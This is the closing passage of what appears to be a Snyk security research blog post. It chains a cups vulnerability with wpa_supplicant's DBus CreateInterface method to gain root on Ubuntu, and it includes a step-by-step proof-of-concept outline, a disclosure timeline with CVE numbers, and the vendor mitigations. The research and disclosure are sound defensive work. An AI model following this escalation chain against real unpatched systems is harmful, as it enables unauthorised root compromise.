root).","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Our final step is to identify a way of getting from any user/group to root.","marks":[],"data":{}}]},{"nodeType":"heading-2","data":{},"content":[{"nodeType":"text","value":"More vulnerability gadgets features","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"There are probably a lot of ways of achieving this. For example, ","marks":[],"data":{}},{"nodeType":"text","value":"/dev/sda2","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" (my root disk) has a group of ","marks":[],"data":{}},{"nodeType":"text","value":"disk","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":", and permissions ","marks":[],"data":{}},{"nodeType":"text","value":"660","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":", so I could use the configuration to set my Group to disk and modify this file. However, when I am in this kind of situation, I always try to err on the side of simplicity. A lot of things can go wrong with modifying a raw disk (even with good tools like ","marks":[],"data":{}},{"nodeType":"text","value":"debugfs","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":"), and it can make exploitation fiddly and unreliable (I’ve done it ","marks":[],"data":{}},{"nodeType":"hyperlink","data":{"uri":"https://issuetracker.google.com/issues/172219872"},"content":[{"nodeType":"text","value":"before","marks":[{"type":"underline"}],"data":{}}]},{"nodeType":"text","value":"). Therefore, I took the time to attempt to identify other options which may be more reliable or at least simpler. When reporting vulnerabilities to vendors, simplicity is always beneficial.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Much like the start of this post, I began by investigating what was available on the DBus bus. This time, however, I first looked at the permission settings in the DBus daemon (defined in ","marks":[],"data":{}},{"nodeType":"text","value":"/usr/share/dbus-1/system.d","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":") to find services accessible by specific users or groups and not to my original user.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"These configuration files look something like the following ","marks":[],"data":{}},{"nodeType":"text","value":"/usr/share/dbus-1/system.d/wpa_supplicant.conf","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":":","marks":[],"data":{}}]},{"nodeType":"embedded-entry-block","data":{"target":{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"JmbqwsvMRNKavKZvpNYTH","type":"Entry","createdAt":"2024-09-09T17:53:58.295Z","updatedAt":"2024-09-09T17:53:58.295Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":4,"revision":1,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"contentCodeBlockSnippets"}},"locale":"en-US"},"fields":{"internalName":"\" Abusing Ubuntu \" - Code block 15","hideLineNumbers":false,"startingLineNumber":1,"snippet":" \u003c!DOCTYPE busconfig PUBLIC\n \"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN\"\n \"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\"\u003e\n\u003cbusconfig\u003e\n        \u003cpolicy user=\"root\"\u003e\n                \u003callow own=\"fi.w1.wpa_supplicant1\"/\u003e\n                \u003callow send_destination=\"fi.w1.wpa_supplicant1\"/\u003e\n                \u003callow send_interface=\"fi.w1.wpa_supplicant1\"/\u003e\n                \u003callow receive_sender=\"fi.w1.wpa_supplicant1\" receive_type=\"signal\"/\u003e\n        \u003c/policy\u003e\n        \u003cpolicy group=\"netdev\"\u003e\n                \u003callow send_destination=\"fi.w1.wpa_supplicant1\"/\u003e\n                \u003callow send_interface=\"fi.w1.wpa_supplicant1\"/\u003e\n                \u003callow receive_sender=\"fi.w1.wpa_supplicant1\" receive_type=\"signal\"/\u003e\n        \u003c/policy\u003e\n        \u003cpolicy context=\"default\"\u003e\n                \u003cdeny own=\"fi.w1.wpa_supplicant1\"/\u003e\n                \u003cdeny send_destination=\"fi.w1.wpa_supplicant1\"/\u003e\n                \u003cdeny receive_sender=\"fi.w1.wpa_supplicant1\" receive_type=\"signal\"/\u003e\n        \u003c/policy\u003e\n\u003c/busconfig\u003e"}}},"content":[]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"In this example, for ","marks":[],"data":{}},{"nodeType":"text","value":"wpa_supplicant","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":", normal users (i.e. ","marks":[],"data":{}},{"nodeType":"text","value":"context=”default”","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":") cannot ","marks":[],"data":{}},{"nodeType":"text","value":"send_destination","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" (call) methods on the interface at all. User root (","marks":[],"data":{}},{"nodeType":"text","value":"user=”root”","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":") can own and call the methods, this is pretty standard but doesn’t help us because we can’t become root. However, the potentially interesting part here is group netdev being allowed to call methods on this interface as well. It turns out the ability for the netdev group to call the interface is actually a Debian-family-specific ","marks":[],"data":{}},{"nodeType":"hyperlink","data":{"uri":"https://git.launchpad.net/ubuntu/+source/wpa/tree/debian/patches/02_dbus_group_policy.patch"},"content":[{"nodeType":"text","value":"addition","marks":[{"type":"underline"}],"data":{}}]},{"nodeType":"text","value":".","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Here we can iterate over finding an interesting interface callable by a user or group we can achieve, enumerate the accessible functions, and read the documentation. I will skip that this time for brevity (and because I did not discover this feature during this research) and we can go straight on to what the gadget is.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"The ","marks":[],"data":{}},{"nodeType":"text","value":"wpa_supplicant","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" service runs as root and, as we saw in the above example, has an interface that could be callable with our previous exploitation by becoming group ","marks":[],"data":{}},{"nodeType":"text","value":"netdev","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":". On this interface there is a method ","marks":[],"data":{}},{"nodeType":"text","value":"CreateInterface","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":". This method is generally used to configure a network interface for wireless network security (e.g. WPA/802.1X). This method takes an argument ","marks":[],"data":{}},{"nodeType":"text","value":"ConfigFile","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":", which is a path to a ","marks":[],"data":{}},{"nodeType":"text","value":"wpa_supplicant.conf","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" configuration file. Looking at the ","marks":[],"data":{}},{"nodeType":"hyperlink","data":{"uri":"https://w1.fi/cgit/hostap/tree/wpa_supplicant/wpa_supplicant.conf#n177"},"content":[{"nodeType":"text","value":"documentation example","marks":[{"type":"underline"}],"data":{}}]},{"nodeType":"text","value":" for this file shows a couple of options that can be used to load arbitrary shared objects which can provide various functionality to the supplicant (e.g. crypto routines).","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"We can, therefore, write a shared object with some payload inside it, create a configuration file which includes a reference to this shared object to be loaded, exploit our previous vulnerability chain to attain command execution with a group ID of netdev, call the ","marks":[],"data":{}},{"nodeType":"text","value":"wpa_supplicant","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":"’s ","marks":[],"data":{}},{"nodeType":"text","value":"CreateInterface","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" DBus method with our configuration file, and achieve arbitrary code execution when ","marks":[],"data":{}},{"nodeType":"text","value":"wpa_supplicant","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" loads the shared object. Because, as previously mentioned, ","marks":[],"data":{}},{"nodeType":"text","value":"wpa_supplicant","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" runs as root, ","marks":[],"data":{}},{"nodeType":"text","value":"we will now have arbitrary root code execution","marks":[{"type":"bold"}],"data":{}},{"nodeType":"text","value":".","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"In the actual proof of concept, we use the shared object to set the Python binary to be setuid root. This makes it very easy to finish our script with an interactive root shell, and perform the cleanup activities necessary to undo what we have changed, such as the cups file permissions.","marks":[],"data":{}}]},{"nodeType":"heading-2","data":{},"content":[{"nodeType":"text","value":"Proof of concept wrap-up","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"The following section combines everything we’ve learned into a walkthrough of what the proof of concept actually looks like, to achieve full root command execution.","marks":[],"data":{}}]},{"nodeType":"ordered-list","data":{},"content":[{"nodeType":"list-item","data":{},"content":[{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Create a staging area in ","marks":[],"data":{}},{"nodeType":"text","value":"/tmp/stage","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" for the symbolic links which we will target with cups.","marks":[],"data":{}}]}]},{"nodeType":"list-item","data":{},"content":[{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Call the ","marks":[],"data":{}},{"nodeType":"text","value":"ServerSetSettings","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" DBus method to change the cups ","marks":[],"data":{}},{"nodeType":"text","value":"Listen","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" parameter to ","marks":[],"data":{}},{"nodeType":"text","value":"/tmp/stage/cupsd.conf","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":", which is a symlink to ","marks":[],"data":{}},{"nodeType":"text","value":"/etc/cups/cupsd.conf","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":".","marks":[],"data":{}}]}]},{"nodeType":"list-item","data":{},"content":[{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"The file ","marks":[],"data":{}},{"nodeType":"text","value":"/etc/cups/cupsd.conf","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" will now be world-writable. Fix up the changes made by ","marks":[],"data":{}},{"nodeType":"text","value":"ServerSetSettings","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" and add an additional ","marks":[],"data":{}},{"nodeType":"text","value":"Listen","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" configuration item pointing to ","marks":[],"data":{}},{"nodeType":"text","value":"/tmp/stage/cups-files.conf","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":", which is a symlink to ","marks":[],"data":{}},{"nodeType":"text","value":"/etc/cups/cups-files.conf","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":".","marks":[],"data":{}}]}]},{"nodeType":"list-item","data":{},"content":[{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Use ","marks":[],"data":{}},{"nodeType":"text","value":"ServerSetSettings","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" to change the ","marks":[],"data":{}},{"nodeType":"text","value":"IdleExitTimeout","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" parameter. We don’t care about this parameter, but we are using it to trigger the cups restart, which is a privileged action.","marks":[],"data":{}}]}]},{"nodeType":"list-item","data":{},"content":[{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"The file ","marks":[],"data":{}},{"nodeType":"text","value":"/etc/cups/cups-files.conf","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" will now be world writable. Modify this file to set the ","marks":[],"data":{}},{"nodeType":"text","value":"Group","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" parameter to ","marks":[],"data":{}},{"nodeType":"text","value":"netdev","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":". We don’t actually need to set the ","marks":[],"data":{}},{"nodeType":"text","value":"User","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" parameter for our chain.","marks":[],"data":{}}]}]},{"nodeType":"list-item","data":{},"content":[{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Repeat step 4 to trigger a restart of cups, causing the ","marks":[],"data":{}},{"nodeType":"text","value":"Group","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" parameter in ","marks":[],"data":{}},{"nodeType":"text","value":"cups-files.conf","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" to take effect.","marks":[],"data":{}}]}]},{"nodeType":"list-item","data":{},"content":[{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Stage for ","marks":[],"data":{}},{"nodeType":"text","value":"wpa_supplicant","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" by creating a configuration file that defines the ","marks":[],"data":{}},{"nodeType":"text","value":"opensc_engine_path","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" pointing to our shared object and creating a Python script to call the ","marks":[],"data":{}},{"nodeType":"text","value":"wpa_supplicant","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":"’s ","marks":[],"data":{}},{"nodeType":"text","value":"CreateInterface","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" method. Because of the required data types of this method, it is easier to use Python than ","marks":[],"data":{}},{"nodeType":"text","value":"dbus-send","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":".","marks":[],"data":{}}]}]},{"nodeType":"list-item","data":{},"content":[{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Install a new printer into cups using the ","marks":[],"data":{}},{"nodeType":"text","value":"PrinterAddWithPpdFile","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":"’s DBus method. The PPD file passed here will define the ","marks":[],"data":{}},{"nodeType":"text","value":"FoomaticRIPCommandLine","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" parameter to execute the Python script created in step 7.","marks":[],"data":{}}]}]},{"nodeType":"list-item","data":{},"content":[{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Print a sample PDF file using the newly created printer. This will trigger the Python script, which will call the ","marks":[],"data":{}},{"nodeType":"text","value":"CreateInterface","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" method, which will cause ","marks":[],"data":{}},{"nodeType":"text","value":"wpa_supplicant","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" to load our shared object defined in our configuration file. This shared object will set Python to be setuid root as soon as it is loaded (using the gcc ","marks":[],"data":{}},{"nodeType":"text","value":"constructor","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" attribute).","marks":[],"data":{}}]}]},{"nodeType":"list-item","data":{},"content":[{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Using the now-changed setuid Python, clean up the changes we have made. Remove any new lines from the various cups configuration files, reset the permissions of these files to their originals, and restart cups so everything takes effect.","marks":[],"data":{}}]}]},{"nodeType":"list-item","data":{},"content":[{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Finally, provide an interactive root shell to the user to finish the proof of concept.","marks":[],"data":{}}]}]}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Or, as a diagram:","marks":[],"data":{}}]},{"nodeType":"embedded-entry-block","data":{"target":{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"CVRX1oxxBQqyElid6fB7R","type":"Entry","createdAt":"2024-09-09T17:53:58.602Z","updatedAt":"2024-09-09T17:53:58.602Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":2,"revision":1,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"contentCloudinaryAsset"}},"locale":"en-US"},"fields":{"internalName":"\"blog-ubuntu-chart\" - original","asset":[{"url":"http://res.cloudinary.com/snyk/image/upload/v1725899741/blog-ubuntu-chart.png","tags":[],"type":"upload","bytes":114303,"width":1037,"format":"png","height":1426,"version":1725899741,"duration":null,"metadata":{},"public_id":"blog-ubuntu-chart","created_at":"2024-09-09T16:35:41Z","secure_url":"https://res.cloudinary.com/snyk/image/upload/v1725899741/blog-ubuntu-chart.png","resource_type":"image"}],"maxWidth":"full"}}},"content":[]},{"nodeType":"heading-2","data":{},"content":[{"nodeType":"text","value":"Conclusion","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"In this post, we have seen that it only takes the leveraging of one small vulnerability, combined with a number of features, to achieve a chain of exploitation resulting in a full privilege escalation. Even where security controls are in place preventing the direct exploitation of a small vulnerability it may still be possible to finesse limited exploitation potential into a much greater impact.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"There are a few key takeaways that I find very useful to bear in mind when performing this kind of research. The first is trying to be as holistic as possible. When looking at a system as complex as an entire Linux distribution, it pays to consider the system as a whole rather than focusing on one component. If I had limited my scope to cups alone, even with the multiple items I identified, I may not have been successful in escalating all the way to root. Still valuable research, to be sure, but not as good as it turned out to be. By keeping my eyes open and not showing favoritism to a single area, it’s possible to pivot to a completely separate area of the system (from printing to networking) to get the results I’d hoped.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"The second key takeaway is that it is not necessary to find everything in order. Especially when it comes to features, it’s very valuable to have notes or prior knowledge of “if I’m in situation X, I could use feature Y to achieve result Z”. Some of the features used in this chain have been around for years, ready to be dropped into your PoC as the next step. Even when looking at something new to you, don’t make assumptions about what is achievable or realistic. You never know when you’ll end up in a weird jail as a low-privilege user, but if you see something in that context, keep it in mind when you’re gluing things together. Do not be afraid to temporarily decrease your privileges if it might help you get higher privileges on the way out. We (arguably) did this here by dropping privileges from rory:sudo to lp:netdev, because we knew lp:netdev could end up higher than rory:sudo could on its own.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"We want to end with a shout-out to both the Ubuntu Security team and the cups team, who responded quickly to the reports. A special shout out to the cups team who were able to produce a patch on the same day as the report which both fixes the direct vulnerability but also added additional security measures, which would have made it doubly difficult to exploit in the first place.","marks":[],"data":{}}]},{"nodeType":"heading-2","data":{},"content":[{"nodeType":"text","value":"Timeline","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"08-May-2024: Reported the vulnerability chain to Ubuntu Security","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"23-May-2024: wpa_supplicant issue assigned ","marks":[],"data":{}},{"nodeType":"hyperlink","data":{"uri":"https://security.snyk.io/vuln/SNYK-UNMANAGED-WPASUPPLICANT-7644387"},"content":[{"nodeType":"text","value":"CVE-2024-5290","marks":[],"data":{}}]},{"nodeType":"text","value":" by Ubuntu security","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"24-May-2024: ","marks":[],"data":{}},{"nodeType":"hyperlink","data":{"uri":"https://github.com/OpenPrinting/cups/security/advisories/GHSA-vvwp-mv6j-hw6f"},"content":[{"nodeType":"text","value":"Reported","marks":[{"type":"underline"}],"data":{}}]},{"nodeType":"text","value":" the cups specific vulnerability to OpenPrinting/cups at Ubuntu’s request. GHSA-vvwp-mv6j-hw6f","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"24-May-2024: cups proposed a suitable patch for the reported vulnerability","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"24-May-2024: cups issue assigned ","marks":[],"data":{}},{"nodeType":"hyperlink","data":{"uri":"https://security.snyk.io/vuln/SNYK-UNMANAGED-OPENPRINTINGCUPS-7254925"},"content":[{"nodeType":"text","value":"CVE-2024-35235","marks":[],"data":{}}]},{"nodeType":"text","value":" by Github","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"30-May-2024: wpa_supplicant ","marks":[],"data":{}},{"nodeType":"hyperlink","data":{"uri":"https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613"},"content":[{"nodeType":"text","value":"bug","marks":[{"type":"underline"}],"data":{}}]},{"nodeType":"text","value":" opened by Ubuntu Security","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"03-June-2024: cups announced upcoming advisory release to ","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"11-June-2024: cups released patch and advisory","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"26-July-2024: wpa_supplicant bug patch created","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"06-Aug-2024: wpa_supplicant patch released","marks":[],"data":{}}]},{"nodeType":"heading-2","data":{},"content":[{"nodeType":"text","value":"Mitigations","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Cups mitigated the identified vulnerability by removing the call to chmod entirely and relying on umask to ensure the permissions are correct. Additionally, when cupsd is configured to be started on-demand (i.e. via systemd socket activation), cupsd will not process the Listen directives itself.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"The wpa_supplicant project mitigated this issue by implementing a mandatory path prefix to ensure that all loaded shared objects are under the /usr/lib directory. This ensures that attacker-controlled code cannot be loaded even with sufficient access to the DBus interface.","marks":[],"data":{}}]}]}}},"menu":{"__typename":"NavigationPrimary","customLogo":null,"customLogoLink":null,"actions":{"__typename":"NavigationPrimaryActionsCollection","items":[{"sys":{"id":"jZfGXRe3L9UtIHd0zy87C","__typename":"Sys"},"__typename":"AtomButton","label":"Sign up","url":"https://app.snyk.io/signup","appearance":{"button":{"variant":"secondary"}}},{"sys":{"id":"3RA7EHvXO0h0D54sNFwXMD","__typename":"Sys"},"__typename":"AtomButton","label":"Book a live demo","url":"/schedule-a-demo/","appearance":{"button":{"variant":"primary"}}}]},"primaryNavItems":{"__typename":"NavigationPrimaryPrimaryNavItemsCollection","items":[{"sys":{"id":"7cN6K41sLBBOklgNMBT1gG","__typename":"Sys"},"__typename":"NavigationPrimaryNavItem","label":"Products","url":null,"dropdownMenuCategories":{"items":[],"__typename":"NavigationPrimaryNavItemDropdownMenuCategoriesCollection"},"dropdownMenuColumns":{"__typename":"NavigationPrimaryNavItemDropdownMenuColumnsCollection","items":[{"sys":{"id":"5t2fA41k54GoPmp5A1fIzz","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumn","rows":{"__typename":"NavigationDropdownMenuColumnRowsCollection","items":[{"sys":{"id":"7pN9Vakk2h437yaepVxz0c","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumnRow","label":"Products","spotlightFirstItem":true,"titleText":null,"submenuLinks":{"__typename":"NavigationDropdownMenuColumnRowItemsCollection","items":[{"sys":{"id":"2juOMSgrV2RG8LupJ4iI6V","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"What is Snyk?","description":"Developer-first security in action","url":"/product/","appearance":{"navItem":{"icon":"blocks"}}},{"sys":{"id":"5t9yVDlolAdLWQJnuAbIAw","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk Code","description":"Secure your code as it's written","url":"/product/snyk-code/","appearance":{"navItem":{"icon":"snyk-code"}}},{"sys":{"id":"4Ms7C8emvCYexxJU7U0nsi","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk Open Source","description":"Avoid vulnerable dependencies","url":"/product/open-source-security-management/","appearance":{"navItem":{"icon":"snyk-oss"}}},{"sys":{"id":"6SU8Lvyw0X1xpKZfcUCqM5","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk Container","description":"Keep your base images secure","url":"/product/container-vulnerability-management/","appearance":{"navItem":{"icon":"snyk-container"}}},{"sys":{"id":"22f9W0yyuUjHyRU3QuwuQ2","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk IaC","description":"Fix IaC misconfigurations in-code","url":"/product/infrastructure-as-code-security/","appearance":{"navItem":{"icon":"snyk-iac"}}},{"sys":{"id":"35fFKOja2rpi7Key62WD4U","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk AppRisk","description":"Reduce risk across your business","url":"/product/snyk-apprisk/","appearance":{"navItem":{"icon":"snyk-apprisk"}}}]}},{"sys":{"id":"2vB3JL9dXDqXJTh8uJFN2h","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumnRow","label":null,"spotlightFirstItem":false,"titleText":null,"submenuLinks":{"__typename":"NavigationDropdownMenuColumnRowItemsCollection","items":[{"sys":{"id":"2dEN1gIF4UsWZxVcL6hZZd","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Pricing","description":null,"url":"/plans/","appearance":{"navItem":{"icon":"monetization"}}}]}}]}},{"sys":{"id":"18X3jkf60S2ksYIYckZ8AM","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumn","rows":{"__typename":"NavigationDropdownMenuColumnRowsCollection","items":[{"sys":{"id":"2aH1MyfxX6Q8i4FZhSnNEM","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumnRow","label":"Solutions","spotlightFirstItem":true,"titleText":null,"submenuLinks":{"__typename":"NavigationDropdownMenuColumnRowItemsCollection","items":[{"sys":{"id":"6gh4rZr5dVDQ2xPfwz3IX8","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Why Snyk?","description":"Modern security in a single platform","url":"/platform/","appearance":{"navItem":{"icon":"checkbox-hover"}}},{"sys":{"id":"S2Mg7oKAddwlwmlrrUjjc","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Application security","description":"Build secure, stay secure","url":"/solutions/application-security/","appearance":{"navItem":{"icon":"shield"}}},{"sys":{"id":"3CnU1uxYJRpsUXF35QBbmh","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Software supply chain security","description":"Mitigate supply chain risk","url":"/solutions/software-supply-chain-security/","appearance":{"navItem":{"icon":"supply-chain"}}},{"sys":{"id":"54ktlEruLFYoojGrjRYtiK","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Secure-AI-generated code","description":"AI writes, Snyk secures","url":"/solutions/secure-ai-generated-code/","appearance":{"navItem":{"icon":"brain"}}},{"sys":{"id":"Gb6oocCkD1QR3LqWUkw2e","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Zero-day vulnerabilities","description":"Fix the first day with Snyk ","url":"/solutions/zero-day-vulnerability-security/","appearance":{"navItem":{"icon":"info-warning"}}},{"sys":{"id":"3EYFR9Df4M8uOkmAy7wT9Z","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Security Intelligence","description":"Comprehensive vulnerability data","url":"/platform/security-intelligence/","appearance":{"navItem":{"icon":"light-bulb"}}}]}}]}},{"sys":{"id":"lT82wtnLjPRA0xXDrJQNf","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumn","rows":{"__typename":"NavigationDropdownMenuColumnRowsCollection","items":[{"sys":{"id":"1wZdcRnifXs8AB6dzDLPkB","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumnRow","label":"Platform","spotlightFirstItem":false,"titleText":null,"submenuLinks":{"__typename":"NavigationDropdownMenuColumnRowItemsCollection","items":[{"sys":{"id":"7zAJdSaEj5KZKcq8tOV1kx","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"DeepCode AI","description":"Purpose-built security AI","url":"/platform/deepcode-ai/","appearance":{"navItem":{"icon":"ai-sparkles"}}},{"sys":{"id":"3pFISO4Ny8QTnAViVlA7AV","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Integrations","description":"SDLC-spanning security","url":"/integrations/","appearance":{"navItem":{"icon":"eclipse"}}},{"sys":{"id":"IES5DRO4RDNIi5lEZfinx","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Code Checker","description":"Write better code for free","url":"/code-checker/","appearance":{"navItem":{"icon":"info-scan"}}}]}},{"sys":{"id":"2KYs9J927QhUi4M1zaghOK","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumnRow","label":"Audience","spotlightFirstItem":false,"titleText":null,"submenuLinks":{"__typename":"NavigationDropdownMenuColumnRowItemsCollection","items":[{"sys":{"id":"7cQOsvFWZnxqNLHllfxl2s","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk for devs","description":"Dev-centric info on demand","url":"https://go.snyk.io/2024-dev-onboarding.html","appearance":{"navItem":{"icon":"developer"}}},{"sys":{"id":"6Cc5G88GaFWMuiMQyzjuu","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Snyk for government","description":"Mission-informed AppSec","url":"/government-security-solution/","appearance":{"navItem":{"icon":"government"}}},{"sys":{"id":"2kYurNmnyAT4CCbEGpCb09","__typename":"Sys"},"__typename":"ContentNavigationItem","label":"Leaders handbook","description":"SAST essentials for genAI","url":"/lp/securing-ai-generated-code/","appearance":{"navItem":{"icon":"handbook"}}}]}}]}},{"sys":{"id":"4rNZ0PUIxI0GNclAa0iXBi","__typename":"Sys"},"__typename":"NavigationDropdownMenuColumn","rows":{"__typename":"NavigationDropdownMenuColumnRowsCollection","items":[{"sys":{"id":"4NTQQaxPDRAW3E7P7EtiOp","__typename":"Sys"},"__typename":"MoleculeMediaCard","image":[{"url":"http://res.cloudinary.com/snyk/image/upload/v1729618965/default-report.b205b2e0.svg","tags":[],"type":"upload","bytes":111916,"width":1200,"format":"svg","height":630,"version":1729618965,"duration":null,"metadata":{},"public_id":"default-report.b205b2e0","created_at":"2024-10-22T17:42:45Z","secure_url":"https://res.cloudinary.com/snyk/image/upload/v1729618965/default-report.b205b2e0.svg","resource_type":"image"}],"headline":"Secure Adoption in Gen AI Era Report","url":"https://go.snyk.io/secure-adoption-in-genai-era.html","linkLabel":"Read 